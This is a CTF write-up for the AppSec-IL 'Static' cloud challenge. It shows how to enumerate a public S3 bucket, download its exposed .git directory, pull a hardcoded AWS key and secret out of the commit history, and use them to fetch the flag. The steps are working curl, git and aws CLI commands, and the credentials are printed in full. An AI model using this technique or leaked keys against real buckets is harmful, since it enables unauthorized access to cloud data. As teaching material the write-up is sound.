# Static
* Category: Cloud
* 200 Points
* Solved by the JCTF Team

## Description
> This is only a static bitcoin currency site.
> 
> What can go wrong?

## Solution

The description isn't lying, the attached website is just a static website about bitcoins. Nothing interesting there. However, the challenge category is "cloud", and when we check the site headers we see:

```console
root@kali:/media/sf_CTFs/appsec/Static# curl -I http://static.appsecil.ctf.today/
HTTP/1.1 200 OK
Date: Mon, 26 Oct 2020 20:49:37 GMT
Content-Type: text/html
Connection: keep-alive
x-amz-id-2: LpLbIofXGbpH19h/0vVulYUBtWpheY6WLJj/B2dgDCoU31gTqOkAxalalnBBdop8oW3/fcazfw4=
x-amz-request-id: AAAE08000EE6407D
Last-Modified: Tue, 13 Oct 2020 08:44:30 GMT
CF-Cache-Status: DYNAMIC
cf-request-id: 06084583170000e60ca18b8000000001
Report-To: {"endpoints":[{"url":"https:\/\/a.nel.cloudflare.com\/report?s=FO9ZoK9uuH0KVaiA0%2BUraPKdZglXwTN94bpd3VyZjKvyDJBvc%2BWbQ7ANJIokazP4rRdMvK2nQ7mzNr23F7vtS1wYqwUqSoE%2FP1j7GHVXt8zSf8N41HBqivr5"}],"group":"cf-nel","max_age":604800}
NEL: {"report_to":"cf-nel","max_age":604800}
Server: cloudflare
CF-RAY: 5e870b7e8945e60c-LHR
```

`x-amz-id-2` and `x-amz-request-id` are Amazon headers. So, let's append `s3.amazonaws.com` and see if we get lucky:

```console
root@kali:/media/sf_CTFs/appsec/Static# curl http://static.appsecil.ctf.today.s3.amazonaws.com/
<?xml version="1.0" encoding="UTF-8"?>
<ListBucketResult xmlns="http://s3.amazonaws.com/doc/2006-03-01/"><Name>static.appsecil.ctf.today</Name><Prefix></Prefix><Marker></Marker><MaxKeys>1000</MaxKeys><IsTruncated>false</IsTruncated><Contents><Key>.git/COMMIT_EDITMSG</Key><LastModified>2020-10-13T09:09:56.000Z</LastModified><ETag>&quot;709dad26ae74855d5c97dd3d29321ad4&quot;</ETag><Size>39</Size><StorageClass>STANDARD</StorageClass></Contents><Contents><Key>.git/HEAD</Key><LastModified>2020-10-13T09:09:56.000Z</LastModified><ETag>&quot;4cf2d64e44205fe628ddd534e1151b58&quot;</ETag><Size>23</Size><StorageClass>STANDARD</StorageClass></Contents><Contents><Key>.git/config</Key><LastModified>2020-10-13T09:09:56.000Z</LastModified><ETag>&quot;0ed3016f577589d5c645cb8183ca4680&quot;</ETag><Size>157</Size><StorageClass>STANDARD</StorageClass></Contents><Contents><Key>.git/description</Key><LastModified>2020-10-13T09:09:56.000Z</LastModified><ETag>&quot;a0a7c3fff21f2aea3cfa1d0316dd816c&quot;</ETag><Size>73</Size><StorageClass>STANDARD</StorageClass></Contents><Contents><Key>.git/hooks/applypatch-msg.sample</Key><LastModified>2020-10-13T09:09:56.000Z</LastModified><ETag>&quot;ce562e08d8098926a3862fc6e7905199&quot;</ETag><Size>478</Size><StorageClass>STANDARD</StorageClass></Contents><Contents><Key>.git/hooks/commit-msg.sample</Key><LastModified>2020-10-13T09:09:56.000Z</LastModified><ETag>&quot;579a3c1e12a1e74a98169175fb913012&quot;</ETag><Size>896</Size><StorageClass>STANDARD</StorageClass></Contents><Contents><Key>.git/hooks/fsmonitor-watchman.sample</Key><LastModified>2020-10-13T09:09:56.000Z</LastModified><ETag>&quot;ea587b0fae70333bce92257152996e70&quot;</ETag><Size>4655</Size><StorageClass>STANDARD</StorageClass></Contents><Contents><Key>.git/hooks/post-update.sample</Key><LastModified>2020-10-13T09:09:56.000Z</LastModified><ETag>&quot;2b7ea5cee3c49ff53d41e00785eb974c&quot;</ETag><Size>189</Size><StorageClass>STANDARD</StorageClass></Contents><Contents><Key>.git/hooks/pre-applypatch.sample</Key><LastModified>2020-10-13T09:09:56.000Z</LastModified><ETag>&quot;054f9ffb8bfe04a599751cc757226dda&quot;</ETag><Size>424</Size><StorageClass>STANDARD</StorageClass></Contents><Contents><Key>.git/hooks/pre-commit.sample</Key><LastModified>2020-10-13T09:09:56.000Z</LastModified><ETag>&quot;305eadbbcd6f6d2567e033ad12aabbc4&quot;</ETag><Size>1643</Size><StorageClass>STANDARD</StorageClass></Contents><Contents><Key>.git/hooks/pre-merge-commit.sample</Key><LastModified>2020-10-13T09:09:56.000Z</LastModified><ETag>&quot;39cb268e2a85d436b9eb6f47614c3cbc&quot;</ETag><Size>416</Size><StorageClass>STANDARD</StorageClass></Contents><Contents><Key>.git/hooks/pre-push.sample</Key><LastModified>2020-10-13T09:09:56.000Z</LastModified><ETag>&quot;3c5989301dd4b949dfa1f43738a22819&quot;</ETag><Size>1348</Size><StorageClass>STANDARD</StorageClass></Contents><Contents><Key>.git/hooks/pre-rebase.sample</Key><LastModified>2020-10-13T09:09:56.000Z</LastModified><ETag>&quot;56e45f2bcbc8226d2b4200f7c46371bf&quot;</ETag><Size>4898</Size><StorageClass>STANDARD</StorageClass></Contents><Contents><Key>.git/hooks/pre-receive.sample</Key><LastModified>2020-10-13T09:09:56.000Z</LastModified><ETag>&quot;2ad18ec82c20af7b5926ed9cea6aeedd&quot;</ETag><Size>544</Size><StorageClass>STANDARD</StorageClass></Contents><Contents><Key>.git/hooks/prepare-commit-msg.sample</Key><LastModified>2020-10-13T09:09:56.000Z</LastModified><ETag>&quot;2b5c047bdb474555e1787db32b2d2fc5&quot;</ETag><Size>1492</Size><StorageClass>STANDARD</StorageClass></Contents><Contents><Key>.git/hooks/update.sample</Key><LastModified>2020-10-13T09:09:56.000Z</LastModified><ETag>&quot;7bf1fcc5f411e5ad68c59b68661660ed&quot;</ETag><Size>3635</Size><StorageClass>STANDARD</StorageClass></Contents><Contents><Key>.git/index</Key><LastModified>2020-10-13T09:09:56.000Z</LastModified><ETag>&quot;c26bf94299b418b41a3e5ca5be8339bc&quot;</ETag><Size>297</Size><StorageClass>STANDARD</StorageClass></Contents><Contents><Key>.git/info/exclude</Key><LastModified>2020-10-13T09:09:56.000Z</LastModified><ETag>&quot;036208b4a1ab4a235d75c181e685e5a3&quot;</ETag><Size>240</Size><StorageClass>STANDARD</StorageClass></Contents><Contents><Key>.git/logs/HEAD</Key><LastModified>2020-10-13T09:09:56.000Z</LastModified><ETag>&quot;efccaf7d1c9cb133254917da972e94f8&quot;</ETag><Size>324</Size><StorageClass>STANDARD</StorageClass></Contents><Contents><Key>.git/logs/refs/heads/master</Key><LastModified>2020-10-13T09:09:56.000Z</LastModified><ETag>&quot;efccaf7d1c9cb133254917da972e94f8&quot;</ETag><Size>324</Size><StorageClass>STANDARD</StorageClass></Contents><Contents><Key>.git/objects/0a/67975a74480e8613c168821411e0fafa76dcce</Key><LastModified>2020-10-13T09:09:56.000Z</LastModified><ETag>&quot;4b3535488af2c2c6999b6b0138fcfa39&quot;</ETag><Size>127</Size><StorageClass>STANDARD</StorageClass></Contents><Contents><Key>.git/objects/0c/ffcb348ff9cec9cd41492a9e5c5a41d86ce96e</Key><LastModified>2020-10-13T09:09:56.000Z</LastModified><ETag>&quot;7f1bbe00539c65b1c0c90d0d6e15d274&quot;</ETag><Size>27</Size><StorageClass>STANDARD</StorageClass></Contents><Contents><Key>.git/objects/17/fb9eb375b41e9a336598e9c6a0c06f5b1f2bee</Key><LastModified>2020-10-13T09:09:56.000Z</LastModified><ETag>&quot;28c1bef6bbe63a71898eae9282ba5ec0&quot;</ETag><Size>512</Size><StorageClass>STANDARD</StorageClass></Contents><Contents><Key>.git/objects/9a/91362d44499b0960b61e7d54e06bc5430749f3</Key><LastModified>2020-10-13T09:09:56.000Z</LastModified><ETag>&quot;bbd6554fb31d0568d656692c96e26468&quot;</ETag><Size>477</Size><StorageClass>STANDARD</StorageClass></Contents><Contents><Key>.git/objects/a9/227a2517566ab157e6f2e88974cdb0e7a138aa</Key><LastModified>2020-10-13T09:09:56.000Z</LastModified><ETag>&quot;d7a73a9e4b5b825e97f2b826769df4c0&quot;</ETag><Size>124</Size><StorageClass>STANDARD</StorageClass></Contents><Contents><Key>.git/objects/cd/b77fdfde915490147433b6e89717ae291d8ecd</Key><LastModified>2020-10-13T09:09:56.000Z</LastModified><ETag>&quot;8a2bb4b201349cea074b2a2beddbe0a6&quot;</ETag><Size>30</Size><StorageClass>STANDARD</StorageClass></Contents><Contents><Key>.git/objects/ce/dbb182b85c38205239bb72029ad208cdf28a4c</Key><LastModified>2020-10-13T09:09:56.000Z</LastModified><ETag>&quot;5a05a9a774b6076358d57ae0ae514e97&quot;</ETag><Size>171</Size><StorageClass>STANDARD</StorageClass></Contents><Contents><Key>.git/objects/d3/696d88d8856698a26e76c4d183f59dc2a6a6f9</Key><LastModified>2020-10-13T09:09:56.000Z</LastModified><ETag>&quot;5e29bcb350486cb381b60ab3fa345ab1&quot;</ETag><Size>92</Size><StorageClass>STANDARD</StorageClass></Contents><Contents><Key>.git/refs/heads/master</Key><LastModified>2020-10-13T09:09:56.000Z</LastModified><ETag>&quot;cac71bf0a6865b04df5bd64841348138&quot;</ETag><Size>41</Size><StorageClass>STANDARD</StorageClass></Contents><Contents><Key>flag.txt</Key><LastModified>2020-10-13T08:44:30.000Z</LastModified><ETag>&quot;fa098ab116f7bb8f311fb8e2d8bd5ad8&quot;</ETag><Size>41</Size><StorageClass>STANDARD</StorageClass></Contents><Contents><Key>index.html</Key><LastModified>2020-10-13T08:44:30.000Z</LastModified><ETag>&quot;45c3725a7cfc8f55ab4b3d6bbee83ad2&quot;</ETag><Size>5466</Size><StorageClass>STANDARD</StorageClass></Contents><Contents><Key>pricing.css</Key><LastModified>2020-10-13T08:44:30.000Z</LastModified><ETag>&quot;9da9b0b9bdb774d189d0046d9836b583&quot;</ETag><Size>376</Size><StorageClass>STANDARD</StorageClass></Contents><Contents><Key>quotes/</Key><LastModified>2020-10-13T08:43:51.000Z</LastModified><ETag>&quot;d41d8cd98f00b204e9800998ecf8427e&quot;</ETag><Size>0</Size><StorageClass>STANDARD</StorageClass></Contents><Contents><Key>quotes/2020-10-13.json</Key><LastModified>2020-10-13T08:44:15.000Z</LastModified><ETag>&quot;915a67d704006e47f59d52fd3e4281ea&quot;</ETag><Size>109</Size><StorageClass>STANDARD</StorageClass></Contents></ListBucketResult>
```

Looks like a bunch of files, let's try to extract just the names:

```console
root@kali:/media/sf_CTFs/appsec/Static# curl http://static.appsecil.ctf.today.s3.amazonaws.com/ -s | grep -Po '(?<=<Key>)([^<]+)(?=</Key>)'
.git/COMMIT_EDITMSG
.git/HEAD
.git/config
.git/description
.git/hooks/applypatch-msg.sample
.git/hooks/commit-msg.sample
.git/hooks/fsmonitor-watchman.sample
.git/hooks/post-update.sample
.git/hooks/pre-applypatch.sample
.git/hooks/pre-commit.sample
.git/hooks/pre-merge-commit.sample
.git/hooks/pre-push.sample
.git/hooks/pre-rebase.sample
.git/hooks/pre-receive.sample
.git/hooks/prepare-commit-msg.sample
.git/hooks/update.sample
.git/index
.git/info/exclude
.git/logs/HEAD
.git/logs/refs/heads/master
.git/objects/0a/67975a74480e8613c168821411e0fafa76dcce
.git/objects/0c/ffcb348ff9cec9cd41492a9e5c5a41d86ce96e
.git/objects/17/fb9eb375b41e9a336598e9c6a0c06f5b1f2bee
.git/objects/9a/91362d44499b0960b61e7d54e06bc5430749f3
.git/objects/a9/227a2517566ab157e6f2e88974cdb0e7a138aa
.git/objects/cd/b77fdfde915490147433b6e89717ae291d8ecd
.git/objects/ce/dbb182b85c38205239bb72029ad208cdf28a4c
.git/objects/d3/696d88d8856698a26e76c4d183f59dc2a6a6f9
.git/refs/heads/master
flag.txt
index.html
pricing.css
quotes/
quotes/2020-10-13.json
```

Now we cat see that there's a flag hiding there. Can it be this easy?

```console
root@kali:/media/sf_CTFs/appsec/Static# curl http://static.appsecil.ctf.today.s3.amazonaws.com/flag.txt
<?xml version="1.0" encoding="UTF-8"?>
<Error><Code>AccessDenied</Code><Message>Access Denied</Message><RequestId>B4E3B7A68A324EBA</RequestId><HostId>X5i0addaCOMzVgekAelnk/rFWoRfvyHeugk4053Wpt6eT0WrgZL7sjy1Sns9u53wpu2jMW9c3g8=</HostId></Error>
```

Obviously not. The next step is clearly to download the git repository and analyze it.

We can use the following command to download all files:
```console
root@kali:/media/sf_CTFs/appsec/Static# curl http://static.appsecil.ctf.today.s3.amazonaws.com/ -s | grep -Po '(?<=<Key>)([^<]+)(?=</Key>)' | while read line ; do dirname="$(dirname $line)"; mkdir -p bucket/$dirname; curl -s http://static.appsecil.ctf.today.s3.amazonaws.com/$line > bucket/$line ; done
```

What we get is the repository:
```console
root@kali:/media/sf_CTFs/appsec/Static# tree -a bucket
bucket
├── flag.txt
├── .git
│   ├── COMMIT_EDITMSG
│   ├── config
│   ├── description
│   ├── HEAD
│   ├── hooks
│   │   ├── applypatch-msg.sample
│   │   ├── commit-msg.sample
│   │   ├── fsmonitor-watchman.sample
│   │   ├── post-update.sample
│   │   ├── pre-applypatch.sample
│   │   ├── pre-commit.sample
│   │   ├── pre-merge-commit.sample
│   │   ├── prepare-commit-msg.sample
│   │   ├── pre-push.sample
│   │   ├── pre-rebase.sample
│   │   ├── pre-receive.sample
│   │   └── update.sample
│   ├── index
│   ├── info
│   │   └── exclude
│   ├── logs
│   │   ├── HEAD
│   │   └── refs
│   │       └── heads
│   │           └── master
│   ├── objects
│   │   ├── 0a
│   │   │   └── 67975a74480e8613c168821411e0fafa76dcce
│   │   ├── 0c
│   │   │   └── ffcb348ff9cec9cd41492a9e5c5a41d86ce96e
│   │   ├── 17
│   │   │   └── fb9eb375b41e9a336598e9c6a0c06f5b1f2bee
│   │   ├── 9a
│   │   │   └── 91362d44499b0960b61e7d54e06bc5430749f3
│   │   ├── a9
│   │   │   └── 227a2517566ab157e6f2e88974cdb0e7a138aa
│   │   ├── cd
│   │   │   └── b77fdfde915490147433b6e89717ae291d8ecd
│   │   ├── ce
│   │   │   └── dbb182b85c38205239bb72029ad208cdf28a4c
│   │   └── d3
│   │       └── 696d88d8856698a26e76c4d183f59dc2a6a6f9
│   └── refs
│       └── heads
│           └── master
├── index.html
├── pricing.css
└── quotes
    └── 2020-10-13.json
```

Simple git commands now work:
```console
root@kali:/media/sf_CTFs/appsec/Static/bucket# git ls-files
.gitignore
main.py
requirements.txt
```

This is how `main.py` currently looks:
```console
root@kali:/media/sf_CTFs/appsec/Static/bucket# git show HEAD:main.py
import requests
import time
import boto3
from botocore.client import Config
import json
from datetime import datetime

BUCKET_NAME = "static.appsecil.ctf.today"
with open("config.json") as config_file:
    config = json.load(config_file)

client = boto3.client(
    's3',
    aws_access_key_id=config['AWS_KEY'],
    aws_secret_access_key=config['AWS_SECRET']
)

def write_to_s3(json_file):
    object = client.upload_fileobj(json_file, BUCKET_NAME, "quotes/"+json_file)
    return bool(object)

def write_to_local(json_obj):
    file_name = datetime.today().strftime('%Y-%m-%d')
    with open(file_name+".json", "w") as f:
        f.write(json.dumps(json_obj))
    return file_name

if __name__ == "__main__":
    get_latest_price = requests.get("https://api.bittrex.com/v3/markets/BSV-USDT/ticker").json()
    file_name = write_to_local(get_latest_price)
    write_to_s3(file_name)
```

We can view commit history:

```console
root@kali:/media/sf_CTFs/appsec/Static/bucket# git log
commit cedbb182b85c38205239bb72029ad208cdf28a4c (HEAD -> master)
Author: Alex <alex@static.com>
Date:   Tue Oct 13 11:58:32 2020 +0300

    Add config file instead of global vars

commit a9227a2517566ab157e6f2e88974cdb0e7a138aa
Author: Alex <alex@static.com>
Date:   Tue Oct 13 11:55:41 2020 +0300

    Initial commit
```

And check the diffs:
```console
root@kali:/media/sf_CTFs/appsec/Static/bucket# git show
commit cedbb182b85c38205239bb72029ad208cdf28a4c (HEAD -> master)
Author: Alex <alex@static.com>
Date:   Tue Oct 13 11:58:32 2020 +0300

    Add config file instead of global vars

diff --git a/.gitignore b/.gitignore
new file mode 100644
index 0000000..0cffcb3
--- /dev/null
+++ b/.gitignore
@@ -0,0 +1 @@
+config.json
\ No newline at end of file
diff --git a/main.py b/main.py
index 17fb9eb..9a91362 100644
--- a/main.py
+++ b/main.py
@@ -5,14 +5,14 @@ from botocore.client import Config
 import json
 from datetime import datetime

-AWS_KEY = "AKIAQEOEU25UQKGTPPOR"
-AWS_SECRET = "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"
 BUCKET_NAME = "static.appsecil.ctf.today"
+with open("config.json") as config_file:
+    config = json.load(config_file)

 client = boto3.client(
     's3',
-    aws_access_key_id=AWS_KEY,
-    aws_secret_access_key=AWS_SECRET
+    aws_access_key_id=config['AWS_KEY'],
+    aws_secret_access_key=config['AWS_SECRET']
 )

 def write_to_s3(json_file):
@@ -28,4 +28,4 @@ def write_to_local(json_obj):
 if __name__ == "__main__":
     get_latest_price = requests.get("https://api.bittrex.com/v3/markets/BSV-USDT/ticker").json()
     file_name = write_to_local(get_latest_price)
-    write_to_s3(file_name)
\ No newline at end of file
+    write_to_s3(file_name)
```

We see that previously, the AWS key and secret were hardcoded in the sources. We can use this to access the S3 bucket:

```console
root@kali:/media/sf_CTFs/appsec/Static# export AWS_ACCESS_KEY_ID=AKIAQEOEU25UQKGTPPOR
root@kali:/media/sf_CTFs/appsec/Static# export AWS_SECRET_ACCESS_KEY=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
root@kali:/media/sf_CTFs/appsec/Static# aws s3 ls s3://static.appsecil.ctf.today
                           PRE .git/
                           PRE quotes/
2020-10-13 11:44:30         41 flag.txt
2020-10-13 11:44:30       5466 index.html
2020-10-13 11:44:30        376 pricing.css
root@kali:/media/sf_CTFs/appsec/Static# aws s3 cp s3://static.appsecil.ctf.today/flag.txt .
download: s3://static.appsecil.ctf.today/flag.txt to ./flag.txt
root@kali:/media/sf_CTFs/appsec/Static# cat flag.txt
AppSec-IL{Keep-j00r-AW2-Key2-t0-j00R5eLF}
```
